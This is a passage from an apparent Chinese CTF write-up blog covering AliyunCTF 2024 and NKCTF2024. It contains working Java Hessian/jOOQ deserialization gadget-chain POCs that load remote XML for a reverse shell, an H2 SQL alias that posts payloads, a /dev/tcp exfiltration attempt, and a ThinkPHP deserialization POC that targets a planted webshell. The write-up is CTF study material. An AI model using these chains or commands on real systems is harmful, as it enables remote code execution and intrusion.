class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;        &#125;        Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;        nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-string">&quot;manqiu&quot;</span>,<span class="hljs-params">atomicReference</span>, <span class="hljs-params">null</span>)</span>);        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">innermap</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">jsonObject</span>,<span class="hljs-string">&quot;raw&quot;</span>,<span class="hljs-params">innermap</span>)</span>;        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">atomicReference</span>,<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-params">jsonNodes</span>)</span>;        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;        Hessian2Output out = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Output(<span class="hljs-params">baos</span>)</span>;        out.set<span class="hljs-constructor">SerializerFactory(<span class="hljs-params">new</span> SerializerFactory()</span>);        out.get<span class="hljs-constructor">SerializerFactory()</span>.set<span class="hljs-constructor">AllowNonSerializable(<span class="hljs-params">true</span>)</span>;        out.write<span class="hljs-constructor">Object(<span class="hljs-params">jsonObject</span>)</span>;        out.flush<span class="hljs-constructor">Buffer()</span>;        String base64String = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(base64String);        byte<span class="hljs-literal">[]</span> data = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(base64String);        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">data</span>)</span>;        Hessian2Input hessian2Input = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Hessian2Input(<span class="hljs-params">byteArrayInputStream</span>)</span>;        Object <span class="hljs-keyword">object</span> = hessian2Input.read<span class="hljs-constructor">Object()</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-keyword">object</span>.get<span class="hljs-constructor">Class()</span>);    &#125;    public static Field get<span class="hljs-constructor">Field(<span class="hljs-params">final</span> Class&lt;?&gt; <span class="hljs-params">clazz</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>)</span> &#123;        Field field = null;        <span class="hljs-keyword">try</span> &#123;            field = clazz.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;            field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        &#125; catch (NoSuchFieldException ex) &#123;            <span class="hljs-keyword">if</span> (clazz.get<span class="hljs-constructor">Superclass()</span> != null)                field = get<span class="hljs-constructor">Field(<span class="hljs-params">clazz</span>.<span class="hljs-params">getSuperclass</span>()</span>, fieldName);        &#125;        return field;    &#125;    public static void set<span class="hljs-constructor">FieldValue(<span class="hljs-params">final</span> Object <span class="hljs-params">obj</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>, <span class="hljs-params">final</span> Object <span class="hljs-params">value</span>)</span> throws Exception &#123;        final Field field = get<span class="hljs-constructor">Field(<span class="hljs-params">obj</span>.<span class="hljs-params">getClass</span>()</span>, fieldName);        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        <span class="hljs-keyword">if</span>(field != null) &#123;            field.set(obj, value);        &#125;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;    &#125;    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;    &#125;&#125;</code></pre></div><h2 id="server-1"><a href="#server-1" class="headerlink" title="server"></a>server</h2><p>只有一个jooq依赖，只需要在其中找到getter进行利用即可</p><p>unknown学的codeql好像帮了Boogipop大佬很多忙，太强了</p><p>目标是<code>ConvertedVal</code>的<code>getValue</code></p><p>但并不是直接在getValue中，要跟进函数</p><p><img src="/../images/chain17/image-20240328113049469.png" alt="image-20240328113049469"></p><p>看到这个我们很容易想到ClassPathXmlApplicationContext加载恶意xml文件</p><p>我们只需要等到获取参数类型为String的构造器即可</p><p>那如何控制这个toClass呢</p><p>调用栈往前找到</p><p><img src="/../images/chain17/image-20240328122110209.png" alt="image-20240328122110209"></p><p><img src="/../images/chain17/image-20240328122138395.png" alt="image-20240328122138395"></p><p>获取DefaultDataType的uType</p><p>可以直接用DefaultDataType，也可以用他的子类</p><p><img src="/../images/chain17/image-20240328122425949.png" alt="image-20240328122425949"></p><p>官方使用的是<code>TableDataType</code></p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><div class="code-wrapper"><pre><code class="hljs reasonml">import cn.hutool.core.io.FileUtil;import cn.hutool.core.util.ReflectUtil;import cn.hutool.core.util.SerializeUtil;import com.fasterxml.jackson.databind.node.POJONode;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import org.jooq.DataType;import org.springframework.context.support.ClassPathXmlApplicationContext;import javax.swing.event.EventListenerList;import javax.swing.undo.UndoManager;import java.io.File;import java.lang.reflect.Constructor;import java.util.Base64;import java.util.Vector;<span class="hljs-comment">// JDK17 VM options:</span><span class="hljs-comment">// --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util.concurrent.atomic=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED --add-opens java.desktop/javax.swing.undo=ALL-UNNAMED --add-opens java.desktop/javax.swing.event=ALL-UNNAMED</span>public <span class="hljs-keyword">class</span> PocServer &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        gen(<span class="hljs-string">&quot;http://localhost:8000/poc.xml&quot;</span>);    &#125;    public static void gen(String url) throws Exception&#123;        Class clazz1 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.jooq.impl.Dual&quot;</span>)</span>;        Constructor constructor1 = clazz1.get<span class="hljs-constructor">DeclaredConstructors()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;        constructor1.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object table = constructor1.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;        Class clazz2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.jooq.impl.TableDataType&quot;</span>)</span>;        Constructor constructor2 = clazz2.get<span class="hljs-constructor">DeclaredConstructors()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;        constructor2.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object tableDataType = constructor2.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">table</span>)</span>;        Class clazz3 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.jooq.impl.Val&quot;</span>)</span>;        Constructor constructor3 = clazz3.get<span class="hljs-constructor">DeclaredConstructor(Object.<span class="hljs-params">class</span>, DataType.<span class="hljs-params">class</span>, <span class="hljs-params">boolean</span>.<span class="hljs-params">class</span>)</span>;        constructor3.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object <span class="hljs-keyword">val</span> = constructor3.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-string">&quot;whatever&quot;</span>, <span class="hljs-params">tableDataType</span>, <span class="hljs-params">false</span>)</span>;        Class clazz4 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.jooq.impl.ConvertedVal&quot;</span>)</span>;        Constructor constructor4 = clazz4.get<span class="hljs-constructor">DeclaredConstructors()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;        constructor4.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        Object convertedVal = constructor4.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">val</span>, <span class="hljs-params">tableDataType</span>)</span>;        Object value = url;        Class <span class="hljs-keyword">type</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPathXmlApplicationContext</span>.</span></span><span class="hljs-keyword">class</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectUtil</span>.</span></span>set<span class="hljs-constructor">FieldValue(<span class="hljs-params">val</span>, <span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-params">value</span>)</span>;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectUtil</span>.</span></span>set<span class="hljs-constructor">FieldValue(<span class="hljs-params">tableDataType</span>, <span class="hljs-string">&quot;uType&quot;</span>, <span class="hljs-params">type</span>)</span>;        ClassPool classPool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;        CtClass ctClass = classPool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);        CtMethod ctMethod = ctClass.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>)</span>;        ctClass.remove<span class="hljs-constructor">Method(<span class="hljs-params">ctMethod</span>)</span>;        ctClass.<span class="hljs-keyword">to</span><span class="hljs-constructor">Class()</span>;        POJONode pojoNode = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">convertedVal</span>)</span>;        EventListenerList eventListenerList = <span class="hljs-keyword">new</span> <span class="hljs-constructor">EventListenerList()</span>;        UndoManager undoManager = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UndoManager()</span>;        Vector vector = (Vector) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectUtil</span>.</span></span>get<span class="hljs-constructor">FieldValue(<span class="hljs-params">undoManager</span>, <span class="hljs-string">&quot;edits&quot;</span>)</span>;        vector.add(pojoNode);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectUtil</span>.</span></span>set<span class="hljs-constructor">FieldValue(<span class="hljs-params">eventListenerList</span>, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;InternalError.<span class="hljs-params">class</span>, <span class="hljs-params">undoManager</span>&#125;)</span>;        byte<span class="hljs-literal">[]</span> data = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SerializeUtil</span>.</span></span>serialize(eventListenerList);        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">data</span>)</span>);    &#125;&#125;</code></pre></div><p>准备恶意xml反弹shell即可</p><h2 id="如何发送payload到server"><a href="#如何发送payload到server" class="headerlink" title="如何发送payload到server"></a>如何发送payload到server</h2><p>Boogipop佬拿到agent的shell后发现没有curl，然后开始想办法，虽然我不知道他是咋实现的</p><p>官方WP是在恶意sql文件中写了一个请求的函数</p><div class="code-wrapper"><pre><code class="hljs reasonml">create alias send <span class="hljs-keyword">as</span> &#x27;<span class="hljs-built_in">int</span> send(String url, String poc) throws java.lang.Exception &#123; java.net.http.HttpRequest request = java.net.http.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HttpRequest</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Builder()</span>.uri(<span class="hljs-keyword">new</span> java.net.<span class="hljs-constructor">URI(<span class="hljs-params">url</span>)</span>).headers(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>).version(java.net.http.HttpClient.Version.HTTP_1_1).<span class="hljs-constructor">POST(<span class="hljs-params">java</span>.<span class="hljs-params">net</span>.<span class="hljs-params">http</span>.HttpRequest.BodyPublishers.<span class="hljs-params">ofString</span>(<span class="hljs-params">poc</span>)</span>).build<span class="hljs-literal">()</span>; java.net.http.HttpClient httpClient = java.net.http.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HttpClient</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">HttpClient()</span>; httpClient.send(request, java.net.http.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HttpResponse</span>.</span><span class="hljs-module"><span class="hljs-identifier">BodyHandlers</span>.</span></span><span class="hljs-keyword">of</span><span class="hljs-constructor">String()</span>); return <span class="hljs-number">0</span>;&#125;&#x27;;call send(&#x27;http:<span class="hljs-comment">//server:8080/read&#x27;, &#x27;&lt;这里填打 server 的 base64 payload&gt;&#x27;)</span></code></pre></div><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>遇到个问题，放入payload会报错</p><p><img src="/../images/chain17/image-20240328180739337.png" alt="image-20240328180739337"></p><p>在前面加个字符就能加载。。。。。</p><p><img src="/../images/chain17/image-20240328180746248.png" alt="image-20240328180746248"></p><p>玄学</p><p><img src="/../images/chain17/image-20240328153704714.png" alt="image-20240328153704714"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>都是自己根据WP分析的原理，也仅仅如此，没有什么其他说法</p><p>那文章虽然结束，但这题还不能结束，还得去找大佬还原做题时的情景，掌握做题技巧，以及那个codeql是咋找到<code>getValue</code>的</p><p>脑子太愚钝了，看了好几天，虽然也有题目很难的原因，但主要还是自己不知道如何去调试，如何去分析</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://xz.aliyun.com/t/14190">https://xz.aliyun.com/t/14190</a></p><p><a href="https://blog.s1um4i.com/2024-AliyunCTF/#Web">2024 AliyunCTF 部分题解 - S1uM4i</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/74/">AliYunCTF By W&amp;M x V&amp;N - W&amp;M Team (wm-team.cn)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NKCTF2024</title>
    <link href="/2024/03/25/NKCTF2024/"/>
    <url>/2024/03/25/NKCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="NKCTF2024"><a href="#NKCTF2024" class="headerlink" title="NKCTF2024"></a>NKCTF2024</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我当年看别人NKCTF2023的WP时就觉得这比赛题目难度很大（对当时的我来说</p><p>现在NKCTF2024来了肯定要打的，虽然也有阿里云CTF，但是他真的难度太大了，没有一点下手空间</p><p>周六晚上开始看，md战绩惨淡</p><p>你有见过思路将近全通，但是题目一个做不出来吗</p><h2 id="My-first-CMS"><a href="#My-first-CMS" class="headerlink" title="My_first_CMS"></a>My_first_CMS</h2><p>sb题，弱口令 弱不了一点，啥字典都没有（虽然看着这么多人解出来了</p><div class="code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>Admin123</code></pre></div><p>进入后台就好了</p><p><a href="https://github.com/capture0x/CMSMadeSimple2">capture0x&#x2F;CMSMadeSimple2: CMS Made Simple Version: 2.2.19 - SSTI (github.com)</a></p><p>发现个CVE能够SSTI</p><p><code>Layout &gt; Design Manager &gt; Breadcrumbs</code></p><p>编辑文章，插入ssti的payload即可: <code>&#123;7*7&#125;</code>, <code>&#123;$smarty.version&#125;</code>, <code>&#123;&#123;7*7&#125;&#125;</code></p><p>没试过，应该行</p><p>….好吧，不行，有security setting，无法使用system等函数 </p><p>那这么说还真不一定做的出来</p><p>预期解是在   <code>Extensions &gt; User Defined Tags </code> 进行RCE</p><p><img src="/../images/NKCTF2024/image-20240325222513420.png" alt="image-20240325222513420"></p><h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h2><p>好啦，参考文章都找到了复现不出来</p><div class="code-wrapper"><pre><code class="hljs scss">tacooooo<span class="hljs-keyword">@qq</span>.<span class="hljs-attribute">com</span>:tacooooo</code></pre></div><p>密码走运测出来了</p><p>然后就根据参考文章复现，但是tm的不知道为什么不行</p><p><a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">Shielder - pgAdmin (&lt;&#x3D;8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE)</a></p><p>参考文章大概的流程</p><p>vps上使用给出的脚本开启一个smb服务</p><p>然后使用给出的代码，生成pickle文件</p><p>需要注意的是题目是Linux端，登陆后上传对应的pickle文件，然后按照指示设置session即可</p><p>但是</p><p><img src="/../images/NKCTF2024/image-20240325123130752.png" alt="image-20240325123130752"></p><p>然后我就想会不会有nc，但我还是算了</p><p>尝试<code>ls / &gt; /dev/tcp/vps-ip/port</code>去重定向，好像也不行</p><p>然后看WP，还tm真有nc，但是这个443看起来有特殊含义，难不成只有443才能连上吗</p><p><img src="/../images/NKCTF2024/image-20240325122743257.png" alt="image-20240325122743257"></p><p>反弹得到 shell 后使用 crontab -e 查看隐藏计划任务里的 flag</p><p>。。。不知道</p><p>感觉crontab应该会在suid中有出现，不然应该察觉不出来</p><p>文章复现不出来。。。。。。</p><h2 id="用过就是熟悉"><a href="#用过就是熟悉" class="headerlink" title="用过就是熟悉"></a>用过就是熟悉</h2><p>。。。。思路全通，但生成payload好像出了点问题</p><p>最近有句话：我比流言蜚语更早认识你</p><p>我比知道利用链更早认识存在的backdoor       。。。。。。</p><p>说一下我整个审计顺序吧（和预期的有点偏差</p><p>我没审过cms，所以刚开始不知道查关键字，就觉得重要的的文件名、文件内容大概看一遍，留个映像</p><p>然后找到</p><p><img src="/../images/NKCTF2024/image-20240325124649048.png" alt="image-20240325124649048"></p><p><img src="/../images/NKCTF2024/image-20240325124702180.png" alt="image-20240325124702180"></p><p><img src="/../images/NKCTF2024/image-20240325124719469.png" alt="image-20240325124719469"></p><p>就知道要用到反序列化链</p><p>然后因为首页是登录框，我就去sql文件中去找密码了（嘻嘻</p><p>找了很久，大部分都是经过加盐后的hash（因为没破解出来</p><p><img src="/../images/NKCTF2024/image-20240325125128948.png" alt="image-20240325125128948"></p><p>然后我就在搜password关键字的时候发现了</p><p><img src="/../images/NKCTF2024/image-20240325125333327.png" alt="image-20240325125333327"></p><p>显示为admin.member.edit的逻辑为修改密码，有明文</p><p><img src="/../images/NKCTF2024/image-20240325125436936.png" alt="image-20240325125436936"></p><p>成功登录</p><p>然后登陆后啥也没有，就在回收站有个新建文件.html</p><p>还原发现是个一句话木马</p><p>因为不是公共靶机，所以肯定是出题人留的，肯定有用  （所以说我最早认识的就是后门</p><p>然后没办法，继续看代码</p><p>我们就看看<code>index.class.php</code>就是首页登录的逻辑</p><p><img src="/../images/NKCTF2024/image-20240325125721047.png" alt="image-20240325125721047"></p><p>发现反序列化入口</p><p>并且发现 登录密码确实是加了盐的</p><p>然后看到注释<code>你知道tp吗</code>，我就去搜了thinkphp的漏洞</p><p>经过一段时间的查看并且配合上我之前粗略的审计</p><p>我发现前面的入口都一样，其他的只是换了位置</p><p>思路通了，利用链也好找，直接看看最终要调用的<code>__call</code>函数有什么能利用的</p><p>就两个</p><p><img src="/../images/NKCTF2024/image-20240325130139441.png" alt="image-20240325130139441"></p><p><img src="/../images/NKCTF2024/image-20240325130203058.png" alt="image-20240325130203058"></p><p>然后我就去构造第一个，但构造完，发现只是写了文件，用include也显示不出内容</p><p>我一怒之下（其实也思考了一段时间</p><p>直接用去包含后门，并且正好没有<code>.</code>，就不管提示了</p><p>。。。但是由于写的payload存在问题，所以没有做出来</p><p>给一下官方的吧</p><p><img src="/../images/NKCTF2024/image-20240325131431276.png" alt="image-20240325131431276"></p><p><img src="/../images/NKCTF2024/image-20240325131740129.png" alt="image-20240325131740129"></p><p>看了之后，我感觉我应该是这里出了问题</p><p><img src="/../images/NKCTF2024/image-20240325131835352.png" alt="image-20240325131835352"></p><p>这里我只声明了Debug，没有声明<code>Testone</code>，甚至没有继承<code>Testone</code></p><div class="code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-keyword">namespace</span> <span class="hljs-symbol">think</span>&#123;<span class="hljs-keyword">class</span> <span class="hljs-symbol">Debug</span>&#123;&#125;&#125;</code></pre></div><p>应该是这的原因，其他都一样</p><p><img src="/../images/NKCTF2024/image-20240325132118963.png" alt="image-20240325132118963"></p><p>然后tm的查看文件竟然直接路由输入就行，woc了啊</p><p>诶，既然这样，那我的payload不一定有问题</p><p>不过既然被放在&#x2F;var&#x2F;www&#x2F;html下，好像还真没毛病</p><p><img src="/../images/NKCTF2024/image-20240325132257888.png" alt="image-20240325132257888"></p><p><img src="/../images/NKCTF2024/image-20240325132414176.png" alt="image-20240325132414176"></p><p>提示有两处，</p><p><img src="/../images/NKCTF2024/image-20240325132539806.png" alt="image-20240325132539806"></p><p><img src="/../images/NKCTF2024/image-20240325132545300.png" alt="image-20240325132545300"></p><p>新建文件说过了，就是后门</p><p>然后给出他是咋解密码的，有点抽象了</p><p><img src="/../images/NKCTF2024/image-20240325133302161.png" alt="image-20240325133302161"></p><p><img src="/../images/NKCTF2024/image-20240325133330781.png" alt="image-20240325133330781"></p><p><img src="/../images/NKCTF2024/image-20240325133344629.png" alt="image-20240325133344629"></p><p><img src="/../images/NKCTF2024/image-20240325133410446.png" alt="image-20240325133410446"></p><p><img src="/../images/NKCTF2024/image-20240325133422040.png" alt="image-20240325133422040"></p><p><img src="/../images/NKCTF2024/image-20240325133446987.png" alt="image-20240325133446987"></p><p>用这个去包含即可</p><p>WOC，写到这里我看到wp中有处地方挺奇怪，问了下出题人，我意识到原来是这里错了</p><h3 id="我的真正错误原因"><a href="#我的真正错误原因" class="headerlink" title="我的真正错误原因"></a>我的真正错误原因</h3><p><img src="/../images/NKCTF2024/image-20240325190940305.png" alt="image-20240325190940305"></p><p>看到这里的二重数组，我下意识地使用<code>$this-&gt;engine = [[&quot;name&quot;=&gt;&quot;data/files/shell&quot;]];</code>去传值</p><p>但这是错误的</p><p>这里特殊的点是用的是<code>__call</code>方法，形参name指的是调用的不存在的方法的名字</p><p>而arguments为什么是array，是因为防止这个不存在的方法传入多个参数</p><p>测试</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><span class="hljs-class"></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$arguments</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$name</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$arguments</span>);    &#125;&#125;<span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;asd&quot;</span>;<span class="hljs-variable">$engine</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;name&quot;</span>=&gt;<span class="hljs-string">&quot;shell&quot;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">Loginsubmit</span>(<span class="hljs-variable">$engine</span>);</code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">11</span>)</span></span> <span class="hljs-string">&quot;Loginsubmit&quot;</span><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span> &#123;  <span class="hljs-selector-attr">[0]</span> =&gt;  <span class="hljs-built_in">array</span>(<span class="hljs-number">1</span>) &#123;    <span class="hljs-string">&#x27;name&#x27;</span> =&gt;    <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;shell&quot;</span>  &#125;&#125;</code></pre></div><p>一个参数，传进去本身就是0下标了</p><p>传两个参数才有1下标</p><div class="code-wrapper"><pre><code class="hljs autoit">$a-&gt;Loginsubmit($engine,$b)<span class="hljs-comment">;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-number">11</span>)</span></span> <span class="hljs-string">&quot;Loginsubmit&quot;</span><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span> &#123;  <span class="hljs-selector-attr">[0]</span> =&gt;  <span class="hljs-built_in">array</span>(<span class="hljs-number">1</span>) &#123;    <span class="hljs-string">&#x27;name&#x27;</span> =&gt;    <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;shell&quot;</span>  &#125;  <span class="hljs-selector-attr">[1]</span> =&gt;  <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;asd&quot;</span>&#125;</code></pre></div><p>这还真不知道，询问出题人后才了解</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Config</span>&#123;    &#125;    <span class="hljs-title class_">class</span> <span class="hljs-title class_">View</span>&#123;        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">data</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$engine</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;data = [<span class="hljs-string">&quot;Loginout&quot;</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>()];            <span class="hljs-variable language_">$this</span>-&gt;engine = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;time&quot;</span>=&gt;<span class="hljs-string">&quot;10086&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>=&gt;<span class="hljs-string">&quot;data/files/shell&quot;</span>);        &#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Collection</span></span>&#123;        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$items</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-variable language_">$this</span>-&gt;items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>();        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span 